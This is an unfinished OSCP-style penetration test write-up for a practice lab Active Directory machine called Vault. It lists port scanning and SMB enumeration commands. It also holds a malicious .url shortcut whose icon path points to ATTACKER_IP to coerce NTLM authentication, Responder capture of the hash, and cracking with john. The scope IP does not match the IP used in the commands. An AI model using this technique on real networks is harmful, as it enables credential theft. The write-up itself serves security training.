# PGP Vault - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-3-5

---

## 0. Lesson Learned


---

## 1. Executive Summary


---

## 2. Scope

- **Target:** 192.168.199.122
- **Environment:** Proving Grounds Practice Vault
- **Testing Window:** 2026-3-4 to 2026-3-5
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

Full TCP Scan:

```
nmap -p- -sCV 192.168.141.172 -T4 -oA vault_tcp
```

Revealing the following open ports:

- 53/tcp - DNS
- 88/tcp - Kerberos
- 135 - RPC
- 139,445/tcp - SMB
- 389/tcp - LDAP
- 464/tcp - Kpasswd
- 636/tcp - LDAPS
- 3268,3269/tcp - Global Catalog
- 3389/tcp - RDP
- 5985/tcp - WinRM

These services indicate the system is functioning as an Active Directory Domain Controller.

---

## 5. Enumeration

LDAP naming contexts were enumerated but further queries failed due to authentication restrictions:

```
ldapsearch -x -H ldap://192.168.141.172 -s base namingcontexts

ldapsearch -x -H ldap://192.168.141.172 -b "DC=vault,DC=offsec" "(objectClass=person)"
```

Anonymous RPC access was denied:

```
rpcclient -U "" -N 192.168.141.172
```

Anonymous SMB enumeration revealed a non-standard share named `DocumentsShare`:

```
smbclient -L //192.168.141.172 -N
```

Connection to the share revealed an empty share with anonymous write access:

```
smbclient //192.168.141.172/DocumentsShare -N
```

Test file uploaded:

```
echo "test" > test.txt

put test.txt
```

---

## 6. Initial Access

Since the share was writeable anonymously, a malicious URL file was created to force authentication to the attacker:

```
[InternetShortcut]
URL=anything
WorkingDirectory=anything
IconFile=\\ATTACKER_IP\%USERNAME%.icon
IconIndex=1
```

Responder was started to capture NTLM authentication:

```
responder -I tun0
```

The malicious file `vault.url` was uploaded to the SMB share:

```
smbclient //192.168.141.172/DocumentsShare -N
put vault.url
```

When the file was accessed by a domain user, NTLMv2 credentials were captured by Responder.

The captured hash was saved locally and cracked with john:

```
john ntlm.hash --wordlists=/usr/share/wordlists/rockyou.txt
```

Recovered credentials:

```
anirudh : SecureHM
```

---

## 7. Post-Exploitation

---

## 8. Privilege Escalation

---

## 9. Proof of Compromise

---

## 10. Findings & Recommendations

---

## 11. Appendix